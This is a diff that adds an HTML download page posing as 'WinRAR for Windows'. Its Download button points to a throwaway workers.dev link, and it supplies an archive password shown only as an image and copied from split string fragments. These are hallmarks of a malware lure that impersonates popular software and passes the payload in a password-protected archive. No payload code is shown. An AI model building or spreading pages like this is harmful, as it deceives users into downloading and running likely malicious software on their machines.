@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>WinRAR for Windows</title>
+<style>
+  body { margin:0; font-family: Arial, sans-serif; color:#fff; background:#000 url('../assets/image/hero.jpg') center/cover fixed no-repeat; min-height:100vh; }
+  .shade { background: rgba(5,8,14,.78); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:30px 16px; }
+  .box { max-width:660px; text-align:center; background: rgba(10,14,20,.72); border:1px solid rgba(255,255,255,.15); border-radius:18px; padding:38px 30px; }
+  h1 { margin:0 0 10px; font-size:40px; }
+  .sub { font-size:18px; color:#e8eef6; }
+  p { color:#c6d0dd; line-height:1.55; }
+  .feats { text-align:left; max-width:430px; margin:18px auto 4px; color:#dbe5f0; line-height:1.9; font-size:15.5px; }
+  .btn { display:inline-block; margin-top:16px; background:#22d3ee; color:#06121a; text-decoration:none; font-weight:bold; font-size:20px; padding:16px 46px; border-radius:12px; }
+  .pwrow { margin-top:26px; display:flex; align-items:center; justify-content:center; gap:12px; flex-wrap:wrap; }
+  .pwrow img { border-radius:8px; height:52px; }
+  .copy { background:#fff; color:#0a0d12; border:0; font-weight:bold; font-size:16px; padding:14px 22px; border-radius:10px; cursor:pointer; }
+  .note { font-size:12.5px; color:#7e8a9c; margin-top:22px; }
+</style>
+</head>
+<body>
+<div class="shade">
+  <div class="box">
+    <h1>WinRAR for Windows</h1>
+    <p class="sub">The archiver everyone has used forever — open anything</p>
+    <p>Fast to grab, easy to start — open it and create something today. No complicated setup, no digging through folders.</p>
+    <div class="feats">
+      &#10003; The full desktop experience, ready to work<br>
+      &#10003; One-click start, clean interface<br>
+      &#10003; Latest Windows build, refreshed regularly<br>
+      &#10003; Feather-light — starts instantly
+    </div>
+    <a class="btn" href="https://aidagttfc.fresh-link.workers.dev/02d20ce7">Download</a>
+    <div class="pwrow">
+      <img src="pw.png" alt="archive key">
+      <button class="copy" id="cp">Copy key</button>
+    </div>
+    <p class="note">Community project. Not affiliated with the original vendor.</p>
+  </div>
+</div>
+<script>
+document.getElementById('cp').onclick = function() {
+  var k = ['IOD','olz','30'].join('');
+  navigator.clipboard.writeText(k);
+  this.textContent = 'Copied';
+};
+</script>
+</body>
+</html>
